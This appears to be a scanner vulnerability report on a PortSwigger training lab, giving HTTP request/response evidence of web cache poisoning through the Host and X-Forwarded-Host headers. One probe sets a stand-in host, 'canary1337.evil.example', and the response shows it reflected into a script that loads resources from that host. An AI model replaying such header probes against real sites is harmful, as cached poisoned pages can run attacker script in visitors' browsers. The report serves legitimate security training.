The application uses a cache that can be manipulated into saving responses that have been influenced by the HTTP Host header.<br><br>Burp sent the following HTTP Host header:<br><br>Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net:45729<br><br>This resulted in a response containing 0a1d009a03d75453819093a800cc00d1.web-security-academy.net:45729. Burp then resent the request with the usual Host header and got the same response, indicating that it had been cached. (confidence: FIRM) [+2 more URL(s): https://0a1d009a03d75453819093a800cc00d1.web-security-academy.net/login, https://0a1d009a03d75453819093a800cc00d1.web-security-academy.net/product] @ https://0a1d009a03d75453819093a800cc00d1.web-security-academy.net/

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr61ken8-2u` — `artifacts/_/ev-mr61ken8-2u/`

Request:

```http
GET / HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net

GET /?qtisby2anp=1 HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net:45729
Accept: */*, text/qtisby2anp
Origin: https://qtisby2anp.0a1d009a03d75453819093a800cc00d1.web-security-academy.net
Connection: close
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 0

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Connection: close
Content-Length: 12377

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"0a1d009a03d75453819093a800cc00d1.web-security-academy.net:45729","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg"
```

- Evidence `ev-mr61mmmj-2w` — `artifacts/_/ev-mr61mmmj-2w/`

Request:

```http
GET /?cb=vbase1 HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
cache-control: no-cache
connection: close
content-encoding: gzip
content-length: 2336
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"0a1d009a03d75453819093a800cc00d1.web-security-academy.net","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating4.png">
                            $94.96
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/13.jpg">
                            <h3>Inflatable Dartboard</h3>
                            <img src="/resources/images/rating4.png">
                            $66.51
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating4.png">
                            $68.79
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $93.40
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating1.png">
                            $48.88
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating1.png">
                            $21.42
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/62.jpg">
                            <h3>Weird Crushes Game</h3>
                            <img src="/resources/images/rating1.png">
                            $33.47
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $70.95
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating1.png">
                            $12.02
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating3.png">
                            $29.77
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/18.jpg">
                            <h3>Portable Hat</h3>
                            <img src="/resources/images/rating4.png">
                            $58.70
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr61mpya-2x` — `artifacts/_/ev-mr61mpya-2x/`

Request:

```http
GET /?cb=vxfh1 HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
user-agent: verdict-scanner/0.1
X-Forwarded-Host: canary1337.evil.example
```

Response:

```http
HTTP/1.1 200
cache-control: no-cache
connection: close
content-encoding: gzip
content-length: 2318
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"canary1337.evil.example","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating4.png">
                            $94.96
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/13.jpg">
                            <h3>Inflatable Dartboard</h3>
                            <img src="/resources/images/rating4.png">
                            $66.51
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating4.png">
                            $68.79
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $93.40
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
                            <h3>Giant Pillow Thing</h3>
                            <img src="/resources/images/rating1.png">
                            $48.88
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/72.jpg">
                            <h3>Baby Minding Shoes</h3>
                            <img src="/resources/images/rating1.png">
                            $21.42
                            <a class="button" href="/product?productId=15">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/62.jpg">
                            <h3>Weird Crushes Game</h3>
                            <img src="/resources/images/rating1.png">
                            $33.47
                            <a class="button" href="/product?productId=16">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/31.jpg">
                            <h3>Couple&apos;s Umbrella</h3>
                            <img src="/resources/images/rating5.png">
                            $70.95
                            <a class="button" href="/product?productId=17">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/70.jpg">
                            <h3>Eye Projectors</h3>
                            <img src="/resources/images/rating1.png">
                            $12.02
                            <a class="button" href="/product?productId=18">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/45.jpg">
                            <h3>ZZZZZZ Bed - Your New Home Office</h3>
                            <img src="/resources/images/rating3.png">
                            $29.77
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/18.jpg">
                            <h3>Portable Hat</h3>
                            <img src="/resources/images/rating4.png">
                            $58.70
                            <a class="button" href="/product?productId=20">View details</a>
                        </div>
                    </section>
                    <script>
                        initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
                    </script>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

- Evidence `ev-mr61ntrw-30` — `artifacts/_/ev-mr61ntrw-30/`

Request:

```http
GET /?cb=vp1 HTTP/1.1
Host: 0a1d009a03d75453819093a800cc00d1.web-security-academy.net
user-agent: verdict-scanner/0.1
```

Response:

```http
HTTP/1.1 200
cache-control: no-cache
connection: close
content-encoding: gzip
content-length: 2336
content-type: text/html; charset=utf-8
set-cookie: <redacted>
x-frame-options: SAMEORIGIN

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"0a1d009a03d75453819093a800cc00d1.web-security-academy.net","path":"/"}
        </script>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script type="text/javascript" src="/resources/js/geolocate.js"></script>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a id='exploit-link' class='button' target='_blank' href='https://exploit-0ade00f003df548e813c92c101a20056.exploit-server.net'>Go to exploit server</a>
                            <button id='submitSolution' class='button' method='POST' path='/submitSolution' parameter='answer' data-answer-prompt='Solution (may not be required, depending on lab - reveal objective for more information)'>Submit solution</button>
                            <script src='/resources/labheader/js/submitSolution.js'></script>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1kZXNpZ24tZmxhd3MvbGFiLXdlYi1jYWNoZS1wb2lzb25pbmctdG8tZXhwbG9pdC1hLWRvbS12dWxuZXJhYmlsaXR5LXZpYS1hLWNhY2hlLXdpdGgtc3RyaWN0LWNhY2hlYWJpbGl0eS1jcml0ZXJpYQ=='>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <div id=shipping-info class=shipping-info>
                        </div>
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/40.jpg">
                            <h3>Sarcastic 9 Ball</h3>
                            <img src="/resources/images/rating2.png">
                            $98.00
                            <a class="button" href="/product?productId=1">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/53.jpg">
                            <h3>High-End Gift Wrapping</h3>
                            <img src="/resources/images/rating2.png">
                            $82.92
                            <a class="button" href="/product?productId=2">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/47.jpg">
                            <h3>3D Voice Assistants</h3>
                            <img src="/resources/images/rating5.png">
                            $73.51
                            <a class="button" href="/product?productId=3">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/38.jpg">
                            <h3>Six Pack Beer Belt</h3>
                            <img src="/resources/images/rating5.png">
                            $74.75
                            <a class="button" href="/product?productId=4">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/27.jpg">
                            <h3>The Trolley-ON</h3>
                            <img src="/resources/images/rating1.png">
                            $55.99
                            <a class="button" href="/product?productId=5">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/64.jpg">
                            <h3>Hexbug Battleground Tarantula Double Pack</h3>
                            <img src="/resources/images/rating2.png">
                            $53.83
                            <a class="button" href="/product?productId=6">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/21.jpg">
                            <h3>Snow Delivered To Your Door</h3>
                            <img src="/resources/images/rating1.png">
                            $69.65
                            <a class="button" href="/product?productId=7">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/57.jpg">
                            <h3>Lightbulb Moments</h3>
                            <img src="/resources/images/rating5.png">
                            $46.31
                            <a class="button" href="/product?productId=8">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/5.jpg">
                            <h3>Cheshire Cat Grin</h3>
                            <img src="/resources/images/rating5.png">
                            $38.41
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/12.jpg">
                            <h3>Hologram Stand In</h3>
                            <img src="/resources/images/rating4.png">
                            $94.96
                            <a class="button" href="/product?productId=10">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/13.jpg">
                            <h3>Inflatable Dartboard</h3>
                            <img src="/resources/images/rating4.png">
                            $66.51
                            <a class="button" href="/product?productId=11">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/7.jpg">
                            <h3>Conversation Controlling Lemon</h3>
                            <img src="/resources/images/rating4.png">
                            $68.79
                            <a class="button" href="/product?productId=12">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/54.jpg">
                            <h3>Robot Home Security Buddy</h3>
                            <img src="/resources/images/rating1.png">
                            $93.40
                            <a class="button" href="/product?productId=13">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/30.jpg">
